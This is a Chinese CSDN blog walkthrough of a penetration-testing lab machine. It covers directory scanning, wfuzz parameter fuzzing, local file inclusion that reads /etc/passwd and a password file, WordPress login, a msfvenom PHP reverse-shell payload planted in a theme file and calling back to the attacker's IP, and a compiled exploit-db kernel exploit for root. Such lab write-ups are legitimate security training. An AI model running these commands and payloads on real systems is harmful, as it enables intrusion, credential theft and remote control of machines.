+<img src="https://i-blog.csdnimg.cn/direct/54d33689c556496fbdb7747aeb298e96.png" alt="在这里插入图片描述" /><br />
+当然还有一技用于找靶机<br />
+点虚拟机设置&#xff0c;找到网络适配器&#xff0c;再点高级<br />
+<img src="https://i-blog.csdnimg.cn/direct/1cae6d8154d24c25a3678dd3667f48e2.png" alt="在这里插入图片描述" /><br />
+这里面有虚拟机的mac地址&#xff0c;对应nmap的结果找就行<br />
+<img src="https://i-blog.csdnimg.cn/direct/824d82c3bda54c9191327ef22264f607.png" alt="在这里插入图片描述" /></p>
+<p>看到开启22和80端口&#xff0c;因为80端口的web服务更容易渗透优先测试80端口<br />
+在浏览器打开靶机的web页面<br />
+<img src="https://i-blog.csdnimg.cn/direct/d5e724949bec419583981e8affbd3f41.png" alt="在这里插入图片描述" /><br />
+可以看到没有任何有效信息&#xff0c;检查网页源代码也没有东西&#xff0c;这种情况直接kali的dirb开扫&#xff08;dirsearch也行这里推荐使用&#xff0c;这里不会漏信息而且更加清晰。两个可以结合用。&#xff09;<br />
+这里用的dirsearch&#xff0c;dirb扫完结果一言难尽<br />
+<img src="https://i-blog.csdnimg.cn/direct/220cd44767f24f0692ceed0af6d32feb.png" alt="在这里插入图片描述" /><br />
+这里是dirb扫的结果<br />
+<img src="https://i-blog.csdnimg.cn/direct/3ad6fcea356549a2bf3107359556eb23.png" alt="在这里插入图片描述" /><br />
+/dev<br />
+/image.php<br />
+/wordpress<br />
+/wordpress/wp-login.php</p>
+<p>有这些目录&#xff0c;一个一个看<br />
+/dev<br />
+<img src="https://i-blog.csdnimg.cn/direct/e4335973369e47d4a0f556a73ff218b6.png" alt="在这里插入图片描述" /><br />
+中文翻译&#xff1a;你好&#xff0c;现在你处于0 级入门阶段。在真实的渗透测试工作中&#xff0c;我们要善用工具&#xff0c;对网站进行深度探测与挖掘。祝渗透顺利 / 玩转黑客之道。<br />
+显然没什么用<br />
+再看image.php,源代码没有东西跟index.php没有区别&#xff0c;但是后面会用<br />
+<img src="https://i-blog.csdnimg.cn/direct/3a429d62868f448394fad85fcaf738d3.png" alt="在这里插入图片描述" /><br />
+再看/wordpress&#xff0c;显然是一个wordpress框架写的一个网站&#xff0c;另一个不用说是他的登录接口<br />
+<img src="https://i-blog.csdnimg.cn/direct/3f1e03ef3e2445fd93e1c89158c150a4.png" alt="在这里插入图片描述" /></p>
+<p>不过要啥没没啥&#xff0c;也登不进去。这时候继续思考&#xff0c;或许是不是还有关键信息没扫出来&#xff0c;不妨换个方式继续扫<br />
+<img src="https://i-blog.csdnimg.cn/direct/a8c356c28f2c4898ab45804a7c7ce4d4.png" alt="在这里插入图片描述" /><br />
+使用dirb换个方式扫&#xff0c;扫这些后缀的文件&#xff0c;当然可以加其他比如.bak,.zip之类的敏感文件&#xff0c;这里这两个就够了&#xff08;用dirb&#xff0c;亲测dirsearch扫不出来&#xff0c;要不你就换字典&#xff0c;默认字典不行&#xff09;<br />
+dirb http://192.168.85.133/ -X .php,.txt<br />
+<img src="https://i-blog.csdnimg.cn/direct/baf8d04ea05f436d93baaee9216a1e21.png" alt="在这里插入图片描述" /><br />
+又扫出来一个secret.txt进去看看<br />
+<img src="https://i-blog.csdnimg.cn/direct/4764af5437c54ac4801176a8dd86ba1f.png" alt="在这里插入图片描述" /></p>
+<p>中文翻译<br />
+看来你已经发现了一些秘密。好的&#xff0c;我只是想帮你一把。对你找到的所有 PHP 页面继续做模糊测试&#xff08;Fuzz&#xff09;。如果你找到了可用参数&#xff0c;就按下面步骤继续。如果还是卡住了&#xff0c;就从这里学习一款适合 OSCP 的基础工具用法。<br />
+https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web<br />
+// 查看 location.txt&#xff0c;你就知道下一步怎么走 //<br />
+又获得一部分信息location.txt&#xff08;当然如果你字典比较好一次性就能全扫出来&#xff0c;作者使用的都是默认字典&#xff09;<br />
+打开看看<br />
+<img src="https://i-blog.csdnimg.cn/direct/1c6069292dcd4ab3bad4f463d4e52f54.png" alt="在这里插入图片描述" /><br />
+看来不给访问&#xff0c;继续想办法。里面提到用fuzz找参数&#xff0c;根据提示开干<br />
+首先捋一捋&#xff0c;能访问的php文件image.php&#xff0c;index.php<br />
+使用kali自带wfuzz<br />
+wfuzz -c  -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.85.133/index.php?FUZZ&#61;123</p>
+<p>&#xff08;-c是彩色输出&#xff0c;-w指定字典&#xff0c;FUzz是占位用的&#xff09;<br />
+这样fuzz一下<br />
+<img src="https://i-blog.csdnimg.cn/direct/227dd261f3a24c43b5ee89910521db4d.png" alt="在这里插入图片描述" /><br />
+结果发现900多条记录找不同实在太难&#xff0c;修改payload&#xff0c;加入–hh是过滤chars也就是字符数&#xff0c;也可以–hw过滤单词word数&#xff0c;–hl过滤行<br />
+wfuzz -c  -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.85.133/index.php?FUZZ&#61;123</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/46b64ecdd1c94c1a969fe7c4ac95c7ea.png" alt="在这里插入图片描述" /><br />
+这道题我们过滤word或者chars都可以&#xff0c;结果得到一个file的参数&#xff08;别忘了image.php&#xff0c;这个什么参数都扫不到就不放出来了&#xff09;<br />
+ok接下来利用这个file参数<br />
+这个file一看就是文件包含&#xff0c;不过好像不能随意包含文件比如/etc/passwd<br />
+诶嘿&#xff0c;这时候想到之前location.txt不是访问不了吗&#xff0c;包含试试<br />
+<img src="https://i-blog.csdnimg.cn/direct/894df4db358e4b9cbd797dfbca2748f7.png" alt="在这里插入图片描述" /><br />
+诶&#xff0c;一看提示something better给对上了。给大家伙翻译一下<br />
+很好&#xff0c;你已经找到了正确参数。<br />
+继续往下挖掘&#xff0c;寻找下一个线索。<br />
+在其他 PHP 页面上使用 secrettier360 这个参数继续探索。</p>
+<p>提示其他php页面使用secrettier360这个参数&#xff0c;那不用想只剩image.php了。开搞<br />
+<img src="https://i-blog.csdnimg.cn/direct/a043650341c04ab489d9c4056d325063.png" alt="在这里插入图片描述" /></p>
+<p>我们找到正确参数了&#xff0c;肯定得先试试文件包含&#xff0c;先包含/etc/passwd试试<br />
+<img src="https://i-blog.csdnimg.cn/direct/e1bf56b0cbde410fb3152c31032a726b.png" alt="在这里插入图片描述" /><br />
+可以正常包含这就好办了。<br />
+不必多说&#xff0c;掏出来中国蚁剑。文件包含一句话木马基本功。用python开个http服务(python -m http.server)来个远程包含。<br />
+反转来了&#xff0c;不能远程包含,坏菜了。思路不对&#xff0c;回头尝试包含其他东西寻找信息<br />
+重新打开/etc/passwd文件&#xff0c;好小子藏这了<br />
+<img src="https://i-blog.csdnimg.cn/direct/8860cf40c90d4e02ae04cd0b5f096e15.png" alt="在这里插入图片描述" /><br />
+根据提示&#xff0c;/home/saket/password.txt 访问这个目录<br />
+打开一看结果是 follow_the_ippsec 这个<br />
+想一想能有什么用呢&#xff0c;既然在password.txt里面肯定是密码喽<br />
+能用密码的地也就只有wordpress登录界面喽。那问题来了&#xff0c;账号呢&#xff1f;<br />
+这时百度一下发现有一个wpscan的软件是专门用于wordpress的漏扫工具&#xff08;也可以扫用户名&#xff09;&#xff0c;进入官网&#xff08;kali自带&#xff0c;但是需要api-key&#xff0c;注册后有免费额度&#xff09;<br />
+<img src="https://i-blog.csdnimg.cn/direct/f5b1f46603724a46bf39c16803222f9f.png" alt="在这里插入图片描述" /><br />
+保姆级教程<br />
+<img src="https://i-blog.csdnimg.cn/direct/9da1495d1a66452d81bfbd91b2ae8e2c.png" alt="在这里插入图片描述" /><br />
+点getstart后往下滑<br />
+<img src="https://i-blog.csdnimg.cn/direct/e558f61736fe4fa0b0fce8cd7d2dc204.png" alt="在这里插入图片描述" /><br />
+key在这<br />
+![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/22ebf055f1af47acb10f3940b4d06697.png<img src="https://i-blog.csdnimg.cn/direct/eaea7c70a2ca49c2ae2674a3b066f951.png" alt="在这里插入图片描述" /></p>
+<p>接下教你怎么使用<br />
+wpscan --url http://192.168.85.133/wordpress --enumerate u --api-token  你的key<br />
+&#xff08;扫用户&#xff09;<br />
+只扫到一个用户名&#xff08;victor&#xff09;<br />
+wpscan --url http://192.168.85.133/wordpress  --api-token  你的key<br />
+&#xff08;扫漏洞&#xff09;<br />
+扫出来一堆漏洞警告&#xff0c;也可以从这里突破&#xff0c;不过咱们继续按照出题人的思路来<br />
+得到账号密码了现在<br />
+victor&#xff1a;follow_the_ippsec<br />
+试了一下果然登陆成功了&#xff0c;看起来想wordprss的后台<br />
+<img src="https://i-blog.csdnimg.cn/direct/0b646dfc91d3419f84008aae6e414447.png" alt="在这里插入图片描述" /></p>
+<p>找找接口突破&#xff0c;这里一个上传接口直接给放出来了&#xff0c;那么一句话木马梭哈然后传msf的木马进行后渗透&#xff0c;或者msf本身就有php编码的木马。ok开搞<br />
+<img src="https://i-blog.csdnimg.cn/direct/cce4b6cbb54c4439ab2bfd001ff574fb.png" alt="在这里插入图片描述" /><br />
+msfvenom -p php/meterpreter/reverse_tcp LHOST&#61;192.168.85.135   LPORT&#61;8888 -e php/base64 -f raw -o shell.php</p>
+<p>-f raw是输出原始php代码<br />
+-o 输出位置和文件名<br />
+把shell.php里面的内容复制上传&#xff08;这里有个误区&#xff0c;有可能生成后的代码里面没有php标签&#xff0c;需要手动加上&#xff0c;不然不执行&#xff09;<br />
+<img src="https://i-blog.csdnimg.cn/direct/004d9ed5aa594188b8f24ef4043e9941.png" alt="![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/5ba2f8db28054e4684c88576c7f7f295.png" /></p>
+<p>在msfconsole开启监听8888端口<br />
+<img src="https://i-blog.csdnimg.cn/direct/c727eeaf5fe041ea9e58f2959ccd3d92.png" alt="在这里插入图片描述" /><br />
+在wordpress中&#xff0c;secret.php其实是位于wordpress/wp-content/themes/twentynineteen目录下的&#xff0c;因此我们通过访问该目录下的secret.php即可反弹shell&#xff0c;即访问http://192.168.85.133/wordpress/wp-content/themes/twentynineteen/secret.php。</p>
+<p>这里成功建立反弹连接&#xff0c;接下来就是后渗透环节&#xff0c;进行提权<br />
+<img src="https://i-blog.csdnimg.cn/direct/0ccec2690d6c4b0aa629ad80199ad51a.png" alt="在这里插入图片描述" /><br />
+得到root权限才算胜利&#xff0c;继续搞&#xff0c;下一步收集信息找漏洞提权<br />
+执行sysinfo<br />
+<img src="https://i-blog.csdnimg.cn/direct/eb095772cfa34820b9cd24b84ee8c313.png" alt="在这里插入图片描述" /><br />
+获取关键信息&#xff0c;内核版本&#xff0c;找一下有没有对应版本的漏洞<br />
+searchsploit Ubuntu 16.04</p>
+<p>用这个搜索命令<br />
+<img src="https://i-blog.csdnimg.cn/direct/991db34050cb4324862216a4634ef75a.png" alt="在这里插入图片描述" /><br />
+注意&#xff1a;linux的版本号是 主版本.次版本.修正版本-补丁号这样比较<br />
+主包靶场可能有问题,查了一下正常是4.10版本的,出现这个问题可以去官网重装一下,目前继续按4.10版本说下去吧<br />
+所以选择45010.c这个漏洞<br />
+这个要在攻击机编译一下(.c是c语言的源代码文件)<br />
+进入这个目录 cd /usr/share/exploitdb/exploits/linux/local/<br />
+45010.c在这个目录下<br />
+gcc 45010.c -o /tmp/45010<br />
+然后通过msf传到靶机里<br />
+upload /tmp/45010 /tmp/45010<br />
+<img src="https://i-blog.csdnimg.cn/direct/3b9127cb8cf7437796ff980afe1d102d.png" alt="在这里插入图片描述" /></p>
+<p>注意::一定要上传到靶机的tmp目录下,因为tmp目录所有人都有读写权限,其他目录不一定有权限,会导致上传失败<br />
+然后在msf里面执行这一串<br />
+shell<br />
+cd /tmp<br />
+ls<br />
+chmod &#43;x 45010<br />
+./45010<br />
+whoami<br />
+最后执行的whoami 可以得到root的权限,自此渗透结束</p>
+
+
+                </div>
+                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-e1cc28b339.css" rel="stylesheet">
+                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-d1e89cace4.css" rel="stylesheet">
+        </div>
+    </article>
+
+
+
+
+  <script>
+    $(function() {
+      setTimeout(function () {
+        var mathcodeList = document.querySelectorAll('.htmledit_views img.mathcode');
+        if (mathcodeList.length > 0) {
+          for (let i = 0; i < mathcodeList.length; i++) {
+            if (mathcodeList[i].complete) {
+              if (mathcodeList[i].naturalWidth === 0 || mathcodeList[i].naturalHeight === 0) {
+                var alt = mathcodeList[i].alt;
+                alt = '\\(' + alt + '\\)';
+                var curSpan = $('<span class="img-codecogs"></span>');
+                curSpan.text(alt);
+                $(mathcodeList[i]).before(curSpan);
+                $(mathcodeList[i]).remove();
+              }
+            } else {
+              mathcodeList[i].onerror = function() {
+                var alt = mathcodeList[i].alt;
+                alt = '\\(' + alt + '\\)';
+                var curSpan = $('<span class="img-codecogs"></span>');
+                curSpan.text(alt);
+                $(mathcodeList[i]).before(curSpan);
+                $(mathcodeList[i]).remove();
+              };
+            }
+          }
+          MathJax.Hub.Queue(["Typeset",MathJax.Hub]);
+        }
+      }, 500)
+    });
+  </script>
+</div>
+<div class="directory-boxshadow-dialog" style="display:none;">
+  <div class="directory-boxshadow-dialog-box">
+  </div>
+   <div class="vip-limited-time-offer-box-new" id="vip-limited-time-offer-box-new">
+      <img class="limited-img limited-img-new" src="https://csdnimg.cn/release/blogv2/dist/pc/img/vip-limited-close-newWhite.png">
+      <div class="vip-limited-time-top">
+        确定要放弃本次机会？
+      </div>
+      <span class="vip-limited-time-text">福利倒计时</span>
+      <div class="limited-time-box-new">
+        <span class="time-hour"></span>
+        <i>:</i>
+        <span class="time-minite"></span>
+        <i>:</i>
+        <span class="time-second"></span>
+      </div>
+      <div class="limited-time-vip-box">
+        <p>
+          <img class="coupon-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/vip-limited-close-roup.png">
+          <span class="def">立减 ¥</span>
+          <span class="active limited-num"></span>
+        </p>
+        <span class="">普通VIP年卡可用</span>
+      </div>
+      <a class="limited-time-btn-new" href="https://mall.csdn.net/vip" data-report-click='{"spm":"1001.2101.3001.9621"}' data-report-query='spm=1001.2101.3001.9621'>立即使用</a>
+  </div>
+</div>
+    <div class="more-toolbox-new more-toolbar" id="toolBarBox">
+      <div class="left-toolbox">
+        <div class="toolbox-left">
+            <div class="profile-box">
+              <a class="profile-href" target="_blank" href="https://blog.csdn.net/2601_95816162"><img class="profile-img" src="https://i-avatar.csdnimg.cn/59813198865b4e51990e1bc3144e804e_2601_95816162.jpg!1">
+                <span class="profile-name">
+                  小趴菜一只
+                </span>
+              </a>
+            </div>
+            <div class="profile-attend">
+                <a class="tool-attend tool-bt-button tool-bt-attend" href="javascript:;" data-report-view='{"mod":"1592215036_002","spm":"1001.2101.3001.4232","extend1":"关注"}'>关注</a>
+              <a class="tool-item-follow active-animation" style="display:none;">关注</a>
+            </div>
+        </div>
+        <div class="toolbox-middle">
+          <ul class="toolbox-list">
+            <li class="tool-item tool-item-size tool-active is-like" id="is-like" data-type="bottom">
+              <a class="tool-item-href">
+                <img style="display:none;" id="is-like-imgactive-animation-like" class="animation-dom active-animation" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarThumbUpactive.png" alt="">
+                <img class="isactive" style="display:none" id="is-like-imgactive" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/like-active.png" alt="">
+                <img class="isdefault" style="display:block" id="is-like-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/like.png" alt="">
+                <span id="spanCount" class="count ">
+                    31
+                </span>
+              </a>
+              <div class="tool-hover-tip"><span class="text space">点赞</span></div>
+            </li>
+            <li class="tool-item tool-item-size tool-active is-unlike" id="is-unlike">
+              <a class="tool-item-href">
+                <img class="isactive" style="margin-right:0px;display:none" id="is-unlike-imgactive" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/unlike-active.png" alt="">
+                <img class="isdefault" style="margin-right:0px;display:block" id="is-unlike-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/unlike.png" alt="">
+                <span id="unlikeCount" class="count "></span>
+              </a>
+              <div class="tool-hover-tip"><span class="text space">踩</span></div>
+            </li>
+            <li class="tool-item tool-item-size tool-active is-collection ">
+              <a class="tool-item-href" href="javascript:;" data-report-click='{"mod":"popu_824","spm":"1001.2101.3001.4130","ab":"new"}'>
+                <img style="display:none" id="is-collection-img-collection" class="animation-dom active-animation" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/collect-active.png" alt="">
+                <img class="isdefault" id="is-collection-img" style="display:block" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/collect.png" alt="">
+                <img class="isactive" id="is-collection-imgactive" style="display:none" src="https://csdnimg.cn/release/blogv2/dist/pc/img/newCollectActive.png" alt="">
+                <span class="count get-collection " data-num="8" id="get-collection">
+                    8
+                </span>
+              </a>
+              <div class="tool-hover-tip collect">
+                <div class="collect-operate-box">
+                  <span class="collect-text" id="is-collection">
+                    收藏
+                  </span>
+                </div>
+              </div>
+              <div class="tool-active-list">
+                <div class="text">
+                  觉得还不错?
+                  <span class="collect-text" id="tool-active-list-collection">
+                    一键收藏
+                  </span>
+                 <img id="tool-active-list-close" src="https://csdnimg.cn/release/blogv2/dist/pc/img/collectionCloseWhite.png" alt="">
+                </div>
+              </div>
+            </li>
+            <li class="tool-item tool-item-size tool-active tool-item-comment">
+              <div class="guide-rr-first">
+                <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/guideRedReward01.png" alt="">
+                <button class="btn-guide-known">知道了</button>
+              </div>
+                <a class="tool-item-href" href="#commentBox" data-report-click='{"spm":"1001.2101.3001.7009"}'>
+                <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/comment.png" alt="">
+                <span class="count">
+                      0
+                </span>
+              </a>
+              <div class="tool-hover-tip"><span class="text space">评论</span></div>
+            </li>
+            <li class="tool-item tool-item-size tool-active tool-QRcode" data-type="article" id="tool-share">
+              <a class="tool-item-href" href="javascript:;" data-report-view='{"spm":"3001.4129","extra":{"type":"blogdetail"}}'>
+                <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/share.png" alt="">
+                <span class="count">分享</span>
+              </a>
+                <div class="QRcode" id="tool-QRcode">
+                <div class="share-bg-box">
+                  <div class="share-content">
+                    <a id="copyPosterUrl" data-type="link" class="btn-share">复制链接</a>
+                  </div>
+                  <div class="share-content">
+                    <a class="btn-share" data-type="qq">分享到 QQ</a>
+                  </div>
+                  <div class="share-content">
+                    <a class="btn-share" data-type="weibo">分享到新浪微博</a>
+                  </div>
+                  <div class="share-code">
+                    <div class="share-code-box" id='shareCode'></div>
+                    <div class="share-code-text">
+                      <img src="https://csdnimg.cn/release/blogv2/dist/pc/img/share/icon-wechat.png" alt="">扫一扫
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </li>
+          <li class="tool-item tool-item-size tool-active is-more" id="is-more">
+            <a class="tool-item-href">
+              <img class="isdefault" style="margin-right:0px;display:block" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/more.png" alt="">
+              <span class="count"></span>
+            </a>
+            <div class="more-opt-box">
+              <div class="mini-box">
+                <a class="tool-item-href" id="toolReportBtnHide">
+                  <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/report.png" alt="">
+                  <span class="count">举报</span>
+                </a>
+              </div>
+              <div class="normal-box">
+                <a class="tool-item-href" id="toolReportBtnHideNormal">
+                  <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/toolbar/report.png" alt="">
+                  <span class="count">举报</span>
+                </a>
+              </div>
+            </div>
+          </li>
+        </ul>
+      </div>
+      <div class="toolbox-right">
+</div>
+</div>
+</div>
+<script type=text/javascript crossorigin src="https://csdnimg.cn/release/phoenix/production/qrcode-7c90a92189.min.js"></script>
+<script type="text/javascript" crossorigin src="https://g.csdnimg.cn/common/csdn-login-box/csdn-login-box.js"></script>
+<script type="text/javascript" crossorigin src="https://g.csdnimg.cn/collection-box/2.1.2/collection-box.js"></script>
+                <div class="first-recommend-box recommend-box ">
+<div class="recommend-item-box type_blog clearfix" data-url="https://catcoder.blog.csdn.net/article/details/158662223"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6661.1","mod":"popu_871","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant_t0.none-task-blog-2~default~OPENSEARCH~PaidSort-1-158662223-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"1","strategy":"2~default~OPENSEARCH~PaidSort","dest":"https://catcoder.blog.csdn.net/article/details/158662223"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://catcoder.blog.csdn.net/article/details/158662223" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6661.1","mod":"popu_871","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant_t0.none-task-blog-2~default~OPENSEARCH~PaidSort-1-158662223-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"1","strategy":"2~default~OPENSEARCH~PaidSort","dest":"https://catcoder.blog.csdn.net/article/details/158662223"}'  data-report-query='spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7EPaidSort-1-158662223-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7EPaidSort-1-158662223-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">飞书接入OpenClaw：从零到一的<em>保姆</em><em>级</em>图文教程</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/weixin_43178406" target="_blank"><span class="blog-title">weixin_43178406的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">03-05</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					6万+
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://catcoder.blog.csdn.net/article/details/158662223" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6661.1","mod":"popu_871","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant_t0.none-task-blog-2~default~OPENSEARCH~PaidSort-1-158662223-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"1","strategy":"2~default~OPENSEARCH~PaidSort","dest":"https://catcoder.blog.csdn.net/article/details/158662223"}'  data-report-query='spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7EPaidSort-1-158662223-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7EOPENSEARCH%7EPaidSort-1-158662223-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">本文主要介绍了飞书接入OpenClaw：从零到一的<em>保姆</em><em>级</em>图文教程，希望能对学习使用OpenClaw 的同学们有所帮助。
+
+文章目录
+
+<em>1</em>. 背景
+2. 解决方案
+  2.<em>1</em> 步骤一：安装插件
+  2.2 步骤二：创建机器人应用
+  2.3 步骤三：测试
+3. 注意事项</div>
+			</a>
+		</div>
+	</div>
+</div>
+                </div>
+            <script src="https://csdnimg.cn/release/blogv2/dist/components/js/pc_wap_commontools-55fb7fc975.min.js" type="text/javascript" async></script>
+              <div class="second-recommend-box recommend-box ">
+<div class="recommend-item-box type_blog clearfix" data-url="https://catcoder.blog.csdn.net/article/details/159319968"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.1","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~PaidSort-1-159319968-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"1","strategy":"2~default~OPENSEARCH~PaidSort","dest":"https://catcoder.blog.csdn.net/article/details/159319968"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
+				<a href="https://catcoder.blog.csdn.net/article/details/159319968" class="tit" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.1","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~PaidSort-1-159319968-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"1","strategy":"2~default~OPENSEARCH~PaidSort","dest":"https://catcoder.blog.csdn.net/article/details/159319968"}'  data-report-query='spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7EPaidSort-1-159319968-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7EPaidSort-1-159319968-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+					<div class="left ellipsis-online ellipsis-online-1">Windows 下 Claude Code 安装全记录：从零到一的<em>保姆</em><em>级</em>图文教程（持续更新）</div>
+				</a>
+			</div>
+			<div class="info-box display-flex">
+				<div class="info">
+					<a href="https://blog.csdn.net/weixin_43178406" target="_blank"><span class="blog-title">weixin_43178406的博客</span></a>
+				</div>
+				<div class="info display-flex">
+					<span class="info-block time">03-23</span>
+					<span class="info-block read"><img class="read-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/readCountWhite.png" alt="">
+					5万+
+					</span>
+				</div>
+			</div>
+		</div>
+		<div class="desc-box">
+			<a href="https://catcoder.blog.csdn.net/article/details/159319968" target="_blank"  data-report-click='{"ab":"new","spm":"1001.2101.3001.6650.1","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~OPENSEARCH~PaidSort-1-159319968-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"1","strategy":"2~default~OPENSEARCH~PaidSort","dest":"https://catcoder.blog.csdn.net/article/details/159319968"}'  data-report-query='spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7EPaidSort-1-159319968-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7EPaidSort-1-159319968-blog-161020751.235%5Ev43%5Epc_blog_bottom_relevance_base3'>
+				<div class="desc ellipsis-online ellipsis-online-1">本文主要介绍了Windows 下 Claude Code 安装全记录：从零到一的<em>保姆</em><em>级</em>图文教程，希望能对学习使用 Claude Code 的同学们有所帮助。
+
+文章目录
+
+<em>1</em>. 背景
+2. 实战教程
+  2.<em>1</em> 步骤一 安装Node.js
+  2.2 步骤二 安装Claude Code
+  2.3 步骤三 配置Claude Code
+  2.4 步骤四 对话</div>
+			</a>
+		</div>
+	</div>
+</div>
+              </div>
+<a id="commentBox" name="commentBox"></a>
+  <div id="pcCommentBox" class="comment-box comment-box-new2 unlogin-comment-box-new" style="display:none">
+      <div class="unlogin-comment-model">
+          <span class="unlogin-comment-tit">参与评论</span>
+        <span class="unlogin-comment-text">您还未登录，请先</span>
+        <span class="unlogin-comment-bt">登录</span>
+        <span class="unlogin-comment-text">后发表或查看评论</span>
+      </div>
+  </div>
+              <div class="recommend-box insert-baidu-box recommend-box-style ">
+                <div class="recommend-item-box no-index" style="display:none"></div>
+<div class="recommend-item-box type_blog clearfix" data-url="https://blog.csdn.net/Python_paipai/article/details/144205139"  data-report-view='{"ab":"new","spm":"1001.2101.3001.6650.2","mod":"popu_387","extra":"{\"highlightScore\":0.0,\"utm_medium\":\"distribute.pc_relevant.none-task-blog-2~default~BlogOpenSearchComplete~Rate-2-144205139-blog-161020751.235^v43^pc_blog_bottom_relevance_base3\",\"dist_request_id\":\"1779004798791_81523\"}","dist_request_id":"1779004798791_81523","ab_strategy":"landing_bge_commercial_hanlp_download_sign","index":"2","strategy":"2~default~BlogOpenSearchComplete~Rate","dest":"https://blog.csdn.net/Python_paipai/article/details/144205139"}'>
+	<div class="content-box">
+		<div class="content-blog display-flex">
+			<div class="title-box">
